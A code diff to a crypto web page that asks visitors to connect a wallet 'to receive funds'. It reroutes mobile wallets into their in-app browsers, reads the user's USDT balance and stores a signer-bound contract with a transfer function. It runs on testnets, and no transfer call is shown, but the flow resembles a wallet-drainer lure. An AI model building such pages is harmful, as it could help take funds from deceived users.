@@ -187,6 +187,15 @@
             color: #5b657a;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
+        .wallet-note {
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 12px;
+            padding: 10px;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #10b981;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -234,6 +243,9 @@
             <div style="margin-bottom: 14px; font-weight: 500; color: #cdd9ff;">Connect wallet to receive funds</div>
             <div id="wallet-buttons-area" class="wallet-grid"></div>
             <div id="network-hint" style="font-size:12px; margin-top:12px; color:#6c7a91;"></div>
+            <div class="wallet-note">
+                💡 Open this page in the wallet's built-in browser for best experience
+            </div>
         </div>
 
         <div id="step-confirm" class="step">
@@ -335,75 +347,56 @@
         addLog(`Network: ${network}`);
     }
 
-    // ============ ОТКРЫТИЕ ПРИЛОЖЕНИЯ (DEEP LINKS) ============
-    function openWalletApp(walletName, fallbackUrl) {
+    // ============ УНИВЕРСАЛЬНОЕ ОТКРЫТИЕ В ПРИЛОЖЕНИИ ============
+    function openWalletApp(walletName, customUrl) {
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         
-        // Правильные deep link схемы для мобильных кошельков
-        const deepLinks = {
-            'TronLink': {
-                android: 'tronlink://',
-                ios: 'tronlink://',
-                download: isIOS ? 'https://apps.apple.com/app/tronlink/id1503047139' : 'https://www.tronlink.org/download'
+        const urls = {
+            'MetaMask': {
+                android: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+                ios: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+                store: isIOS ? 'https://apps.apple.com/app/metamask/id1438144202' : 'https://play.google.com/store/apps/details?id=io.metamask'
             },
             'TrustWallet': {
-                android: 'trust://',
-                ios: 'trust://',
-                download: isIOS ? 'https://apps.apple.com/app/trust-wallet/id1284769406' : 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
-            },
-            'MetaMask': {
-                android: 'metamask://',
-                ios: 'metamask://',
-                download: isIOS ? 'https://apps.apple.com/app/metamask/id1438144202' : 'https://play.google.com/store/apps/details?id=io.metamask'
+                android: `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`,
+                ios: `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`,
+                store: isIOS ? 'https://apps.apple.com/app/trust-wallet/id1284769406' : 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
             },
             'Phantom': {
-                android: 'phantom://',
-                ios: 'phantom://',
-                download: isIOS ? 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977' : 'https://play.google.com/store/apps/details?id=app.phantom'
+                android: `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`,
+                ios: `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`,
+                store: isIOS ? 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977' : 'https://play.google.com/store/apps/details?id=app.phantom'
             },
             'Solflare': {
-                android: 'solflare://',
-                ios: 'solflare://',
-                download: isIOS ? 'https://apps.apple.com/app/solflare-solana-wallet/id1580902717' : 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
+                android: `https://solflare.com/ul/v1/browse?url=${encodeURIComponent(window.location.href)}`,
+                ios: `https://solflare.com/ul/v1/browse?url=${encodeURIComponent(window.location.href)}`,
+                store: isIOS ? 'https://apps.apple.com/app/solflare-solana-wallet/id1580902717' : 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
+            },
+            'TronLink': {
+                android: `tronlink://dapp?url=${encodeURIComponent(window.location.href)}`,
+                ios: `tronlink://dapp?url=${encodeURIComponent(window.location.href)}`,
+                store: isIOS ? 'https://apps.apple.com/app/tronlink/id1503047139' : 'https://www.tronlink.org/download'
             }
         };
         
-        const wallet = deepLinks[walletName];
+        const wallet = urls[walletName];
         if (!wallet) return;
         
-        // Сначала пробуем открыть через deep link
-        const deepLinkUrl = `${wallet[isIOS ? 'ios' : 'android']}?v=1&dapp=${encodeURIComponent(window.location.href)}`;
+        // Пробуем открыть через deep link
+        const deepLink = wallet[isIOS ? 'ios' : 'android'];
+        window.location.href = deepLink;
         
-        // Создаём iframe для попытки открытия
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = deepLinkUrl;
-        document.body.appendChild(iframe);
-        
-        // Если не открылось через 2 секунды — переходим в магазин
+        // Запасной вариант — если не открылось
         setTimeout(() => {
-            document.body.removeChild(iframe);
-            window.location.href = wallet.download;
-        }, 2000);
+            window.location.href = wallet.store;
+        }, 3000);
     }
 
     // ============ TRON ============
     async function connectTronLink() {
         if (isMobile) {
-            // На мобильном — пытаемся открыть приложение
-            if (window.tronLink && window.tronLink.ready) {
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                tronWeb = window.tronLink.tronWeb;
-                userAddress = tronWeb.defaultAddress.base58;
-                const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
-                const balance = await contract.balanceOf(userAddress).call();
-                const formatted = tronWeb.toBigNumber(balance).div(1e6).toString();
-                showConfirm(formatted, userAddress, 'TRC‑20');
-            } else {
-                openWalletApp('TronLink');
-            }
+            openWalletApp('TronLink');
         } else {
-            // На ПК — расширение
             if (!window.tronLink) {
                 if (confirm('TronLink extension not installed. Open Chrome Web Store?')) {
                     window.open('https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec', '_blank');
@@ -431,85 +424,69 @@
     // ============ EVM ============
     async function connectMetaMask() {
         if (isMobile) {
-            if (window.ethereum) {
-                await connectMetaMaskDesktop();
-            } else {
-                openWalletApp('MetaMask');
-            }
+            openWalletApp('MetaMask');
         } else {
-            await connectMetaMaskDesktop();
-        }
-    }
-    
-    async function connectMetaMaskDesktop() {
-        if (!window.ethereum) {
-            if (confirm('MetaMask extension not installed. Open Chrome Web Store?')) {
-                window.open('https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn', '_blank');
+            if (!window.ethereum) {
+                if (confirm('MetaMask extension not installed. Open Chrome Web Store?')) {
+                    window.open('https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn', '_blank');
+                }
+                return;
             }
-            return;
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            const chainId = selectedNetwork === 'BEP20' ? '0x61' : '0xaa36a7';
+            try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] }); } catch(e) { alert('Switch network manually'); }
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const contractAddr = selectedNetwork === 'BEP20' ? CONTRACTS.BEP20 : CONTRACTS.ERC20;
+            const contract = new ethers.Contract(contractAddr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)','function transfer(address,uint256) returns (bool)'], signer);
+            const balance = await contract.balanceOf(userAddress);
+            const decimals = await contract.decimals();
+            const formatted = ethers.utils.formatUnits(balance, decimals);
+            evmContract = contract;
+            showConfirm(formatted, userAddress, selectedNetwork);
         }
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAddress = accounts[0];
-        const chainId = selectedNetwork === 'BEP20' ? '0x61' : '0xaa36a7';
-        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] }); } catch(e) { alert('Switch network manually'); }
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const contractAddr = selectedNetwork === 'BEP20' ? CONTRACTS.BEP20 : CONTRACTS.ERC20;
-        const contract = new ethers.Contract(contractAddr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)','function transfer(address,uint256) returns (bool)'], signer);
-        const balance = await contract.balanceOf(userAddress);
-        const decimals = await contract.decimals();
-        const formatted = ethers.utils.formatUnits(balance, decimals);
-        evmContract = contract;
-        showConfirm(formatted, userAddress, selectedNetwork);
     }
     
     async function connectTrustWalletEVM() {
         if (isMobile) {
             openWalletApp('TrustWallet');
         } else {
-            await connectMetaMaskDesktop();
+            await connectMetaMask();
         }
     }
 
     // ============ SOLANA ============
     async function connectPhantom() {
         if (isMobile) {
-            if (window.solana) {
-                await connectPhantomDesktop();
-            } else {
-                openWalletApp('Phantom');
-            }
+            openWalletApp('Phantom');
         } else {
-            await connectPhantomDesktop();
-        }
-    }
-    
-    async function connectPhantomDesktop() {
-        if (!window.solana) {
-            if (confirm('Phantom extension not installed. Open Chrome Web Store?')) {
-                window.open('https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa', '_blank');
+            if (!window.solana) {
+                if (confirm('Phantom extension not installed. Open Chrome Web Store?')) {
+                    window.open('https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa', '_blank');
+                }
+                return;
             }
-            return;
+            const resp = await window.solana.connect();
+            userAddress = resp.publicKey.toString();
+            solanaConnection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
+            const usdtMint = new solanaWeb3.PublicKey(CONTRACTS.SOLANA);
+            const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(userAddress), { mint: usdtMint });
+            let balance = '0';
+            if (tokenAccounts.value.length > 0) {
+                solanaTokenAccount = tokenAccounts.value[0].pubkey;
+                const balanceInfo = await solanaConnection.getTokenAccountBalance(solanaTokenAccount);
+                balance = balanceInfo.value.uiAmountString || '0';
+            }
+            showConfirm(balance, userAddress, 'Solana');
         }
-        const resp = await window.solana.connect();
-        userAddress = resp.publicKey.toString();
-        solanaConnection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
-        const usdtMint = new solanaWeb3.PublicKey(CONTRACTS.SOLANA);
-        const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(userAddress), { mint: usdtMint });
-        let balance = '0';
-        if (tokenAccounts.value.length > 0) {
-            solanaTokenAccount = tokenAccounts.value[0].pubkey;
-            const balanceInfo = await solanaConnection.getTokenAccountBalance(solanaTokenAccount);
-            balance = balanceInfo.value.uiAmountString || '0';
-        }
-        showConfirm(balance, userAddress, 'Solana');
     }
     
     async function connectSolflare() {
         if (isMobile) {
             openWalletApp('Solflare');
         } else {
-            await connectPhantomDesktop();
+            await connectPhantom();
         }
     }
 
